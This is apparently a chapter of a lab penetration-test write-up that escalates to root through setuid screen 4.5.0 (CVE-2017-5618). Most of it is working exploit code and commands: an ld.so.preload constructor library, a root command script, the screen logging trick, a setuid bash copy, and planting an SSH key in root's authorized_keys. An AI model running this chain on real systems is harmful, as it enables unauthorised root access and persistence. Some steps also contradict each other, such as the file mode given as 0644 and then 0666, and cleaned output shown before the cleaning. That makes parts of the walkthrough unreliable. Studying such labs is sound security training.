# 06 — Privilege escalation: setuid screen 4.5.0

One setuid binary, one old release, one file it creates as root. This chapter is the whole box.

---

## 6.1 The contradiction

```
/usr/bin/screen -> screen-4.5.0
-rwsr-xr-x 1 root root 1860304 May 10  2021 /usr/bin/screen-4.5.0
-rwxr-xr-x 1 root root  474280 Feb 23  2021 /usr/bin/screen.old
```

and the package database:

```bash
dpkg -l | grep -E "^ii  screen"
```

```
ii  screen  4.8.0-1ubuntu0.1  amd64  terminal multiplexer with VT100/ANSI terminal emulation
```

The **package** is `4.8.0-1ubuntu0.1` — Ubuntu's fully patched build. The **binary being executed** is
`4.5.0`, setuid root, reached through a symlink. `dpkg` is describing a file that is no longer the
one on the path.

This is the single most important lesson on this box: **`dpkg -l`, `apt list --installed` and every
scanner that reads them will report this host as patched.** The version string in the package
database is metadata about what *should* be installed. `ls -la /usr/bin/screen*` is metadata about
what *is*.

`screen 4.5.0` is the last release affected by **CVE-2017-5618**.

---

## 6.2 What the bug actually is

`screen -L` writes a log of the session to a file. In 4.5.0, when screen is installed setuid root, it
does **not** drop privileges before creating that log file, and it derives the file's permissions
from the caller's `umask`.

Two consequences, both attacker-controlled:

1. **The path is relative to the caller's working directory.** Run it from `/etc` and the log file is
   created in `/etc`.
2. **The mode comes from `umask`.** `umask 000` before invoking it produces a file that is
   world-writable — created by root, owned by root, but writable by us.

So a setuid-root program hands an unprivileged user a root-owned, world-writable file **anywhere on
the filesystem**, plus the ability to append to it through screen's own logging.

The obvious landing spot is `/etc/ld.so.preload` — the dynamic loader's "preload these libraries
into every process" file. If we can write there, the next setuid-root binary that starts loads our
shared object **as root**, before `main()` runs.

`screen 4.5.1` fixed it by refusing to use a setuid configuration and by opening the log with
`O_NOFOLLOW|O_EXCL`.

---

## 6.3 The payload

Two files. A preload library, and the script it runs:

```c
/* libhax.c — constructor runs before main(), in the loader, as euid 0 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

__attribute__ ((__constructor__))
void dropshell(void){
    if (geteuid() != 0)          /* every process loads it; only act as root */
        return;

    int fd = open("/tmp/screenroot/.lock", O_CREAT | O_EXCL | O_WRONLY, 0600);
    if (fd < 0)                  /* single-shot: never run twice */
        return;
    close(fd);

    unlink("/etc/ld.so.preload");  /* remove ourselves before spawning children */
    system("/bin/sh /tmp/screenroot/rootcmd.sh > /tmp/screenroot/rootout.txt 2>&1");
    chmod("/tmp/screenroot/rootout.txt", 0666);
}
```

```bash
# rootcmd.sh — what root should do for us
id
hostname
echo "--- proof.txt ---"
cat /root/proof.txt
echo "--- artifacts ---"
cp /bin/bash /tmp/screenroot/rbash
chmod 4755 /tmp/screenroot/rbash
ls -la /tmp/screenroot
```

Three details in that C are deliberate and each one is load-bearing:

- **`geteuid() != 0` guard.** `/etc/ld.so.preload` is read by *every* dynamic binary, including the
  ones our own shell spawns. Without the guard the constructor would recurse into every command.
- **`.lock` with `O_EXCL`.** Even with the guard, several setuid processes may start within the same
  second. `O_CREAT|O_EXCL` makes exactly one of them win.
- **`unlink("/etc/ld.so.preload")` before `system()`.** The child shell is a dynamic binary; if the
  preload file is still there, *it* loads the library too, and now `system()` is running inside a
  process that already ran `system()`. Removing the file first makes the export single-use and keeps
  the tree finite.

Build it against the oldest ABI that will run (chapter 05, §5.4):

```bash
gcc -Os -fPIC -shared -o libhax.so libhax.c
strip --strip-unneeded libhax.so
objdump -T libhax.so | grep -oE 'GLIBC_[0-9.]+' | sort -uV   # -> GLIBC_2.2.5
```

No compiler on the target and no way to fetch one: push both files through the Aerospike socket
(chapter 04, §4.6), verifying the hash on the far side. A reverse shell (§4.5) gives you a terminal,
but a terminal is a poor transport for a 14 KB shared object.

---

## 6.4 Writing the preload file — and the CRLF trap

```bash
cd /etc && umask 000 && \
screen -D -m -L ld.so.preload /bin/sh -c 'printf "\n/tmp/screenroot/libhax.so\n"' >/dev/null 2>&1
```

The file exists, and it is exactly what we wanted:

```bash
stat -c "%A %U:%G %s %n" /etc/ld.so.preload
```

```
-rw-rw-rw- root:aero 29 /etc/ld.so.preload
```

Root-owned, **world-writable**, 29 bytes. `umask 000` did its job.

But it does not work:

```bash
cat /etc/ld.so.preload
```

```
ERROR: ld.so: object '\r' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object '/tmp/screenroot/libhax.so\r' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
```

Look at what the loader is being asked to open: `/tmp/screenroot/libhax.so\r`.

**screen's logger writes CRLF.** It is a terminal multiplexer — its log is a transcript of a
terminal, and terminals end lines with `\r\n`. The file we wrote with `printf "\n…\n"` was recorded
as `\r\n…\r\n`, and `ld.so` treats the trailing carriage return as part of the filename. There is no
such file, so every preload is ignored — and, crucially, **silently**: `ld.so` warns and continues.
The box looks like it worked.

Check bytes, not text:

```bash
cat -A /etc/ld.so.preload
```

```
/tmp/screenroot/libhax.so$
```

`$` marks end-of-line with no `^M` before it — this is the *cleaned* version, shown below.

There are two ways out:

- `dos2unix` / `tr -d '\r'` the file — but as `aero` we have no write permission on a `0644`
  root-owned file.
- **Rewrite it entirely** — which we can do, because `umask 000` made it `0666`:

```bash
printf "/tmp/screenroot/libhax.so\n" > /etc/ld.so.preload
cat -A /etc/ld.so.preload
```

```
/tmp/screenroot/libhax.so$
```

One clean LF-terminated path. That server-side rewrite is the step everyone skips: the *creation*
primitive gave us root ownership, but the `0666` mode is what gave us a *correcting* write. Without
it the CRLF would have been a hard wall.

---

## 6.5 Trigger

`/etc/ld.so.preload` is only read when a dynamic binary starts. Any setuid-root binary will do, and
the convenient one is the same program we abused to create the file:

```bash
screen -ls >/dev/null 2>&1
```

That is a setuid-root `screen`. The loader reads the preload file, maps `libhax.so`, runs the
constructor as `euid 0`, the constructor deletes the preload file and executes `rootcmd.sh` as root.

Two seconds later:

```bash
ls -la /etc/ld.so.preload
cat /tmp/screenroot/rootout.txt
```

```
ls: cannot access '/etc/ld.so.preload': No such file or directory
--- rootout ---
uid=0(root) gid=0(root) groups=0(root)
lab-pwk2-student-cl4-143-ubuntu20-aero-242-100
--- proof.txt ---
7fd0bd2e18b52d791a6600fbd8e622b7
--- artifacts ---
-rwsr-xr-x 1 root root 1183448 /tmp/screenroot/rbash
```

The preload file is gone because the payload removed it — that is the self-cleaning step working,
not a failure. `rbash` is a setuid copy of bash, kept for interactive use.

---

## 6.6 The interactive shell

A setuid bash gives `euid=0` with `uid` still `aero`:

```bash
/tmp/screenroot/rbash -p -c 'id'
```

```
uid=1000(aero) gid=1000(aero) euid=0(root) groups=1000(aero)
```

That is enough to read anything, but it is not a comfortable session — `sudo` still asks `aero` for a
password, and some tools behave differently when `uid != euid`. The clean finish is a key:

```bash
ssh-keygen -t ed25519 -N "" -f /tmp/exam_key -C exam-root
```

Push `exam_key.pub` through the same socket, then, as root:

```bash
mkdir -p /root/.ssh
cp /tmp/screenroot/exam_key.pub /root/.ssh/authorized_keys
chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys
```

```bash
ssh -i /tmp/exam_key root@192.168.150.143
```

```
root@lab-pwk2-student-cl4-143-ubuntu20-aero-242-100:~# id
uid=0(root) gid=0(root) groups=0(root)
```

> A quoting note, because it cost a round trip: writing the key with
> `rbash -c "echo \"ssh-ed25519 …\""` through the UDF layer mangles the quotes and produces an empty
> file (`wc -c` → `0`). Upload the `.pub` as a **file** and `cp` it into place. Avoid nesting three
> levels of quoting across a socket.

Root, with a real TTY. Chapter 07 collects the flags and tidies up.
